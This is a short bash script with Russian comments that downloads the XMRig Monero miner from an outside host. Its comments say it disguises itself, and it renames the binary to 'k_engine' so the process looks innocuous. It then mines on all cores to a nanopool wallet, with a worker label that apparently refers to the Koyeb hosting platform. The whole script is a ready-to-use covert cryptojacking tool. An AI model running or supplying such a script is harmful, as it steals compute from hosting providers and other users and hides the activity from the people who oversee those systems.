#!/bin/bash

# Скачиваем, распаковываем, маскируемся
wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz
tar -zxvf xmrig-6.20.0-linux-x64.tar.gz
cd xmrig-6.20.0
mv xmrig k_engine

# Запускаем майнер на все доступные ядра
# ЗАМЕНИ КОШЕЛЕК НА СВОЙ!
./k_engine -o xmr-eu1.nanopool.org:14444 -u 45dVMwtYuoyNcU26FHy4FpNmqL5HeXdu3cNbzqmvPU1SHyF2WcdafBRT29EZJvinUuePUL6LgSZdpJEbt6JEfnLZDh31puH -p koyeb-blackbox -k
